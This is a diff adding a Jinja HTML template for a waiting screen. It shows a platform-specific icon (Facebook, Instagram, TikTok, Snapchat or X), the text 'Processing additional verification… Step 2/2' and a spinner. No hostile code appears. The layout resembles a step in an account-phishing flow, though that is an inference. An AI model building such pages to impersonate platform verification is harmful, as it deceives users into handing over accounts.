@@ -1,1 +1,28 @@
+{% extends "base.html" %}
+{% block body %}
+<div class="card center glow-card" style="flex-direction:column;align-items:center;text-align:center;padding:40px 28px; max-width:320px;margin:60px auto;border-radius:20px;position:relative;background:linear-gradient(135deg, #ffffff 0%, #fafbfc 100%);border:1px solid #f1f5f9;">
 
+
+<!-- Platform Icon -->
+<div class="platform-icon animate-icon">
+{% if platform == 'facebook' %}
+<i class="fa-brands fa-facebook-f"></i>
+{% elif platform == 'instagram' %}
+<i class="fa-brands fa-instagram"></i>
+{% elif platform == 'tiktok' %}
+<i class="fa-brands fa-tiktok"></i>
+{% elif platform == 'snapchat' %}
+<i class="fa-brands fa-snapchat-ghost"></i>
+{% elif platform == 'twitter' %}
+<i class="fa-brands fa-x-twitter"></i>
+{% endif %}
+</div>
+
+
+<h3 class="notranslate" style="font-size:20px;font-weight:600;margin-bottom:12px;color:#334155;">Processing additional verification…</h3>
+<p class="notranslate" style="font-size:14px;color:#64748b;margin-bottom:18px;">This may take a moment (Step 2/2)</p>
+
+
+<div class="spinner"></div>
+</div>
+{% endblock %}
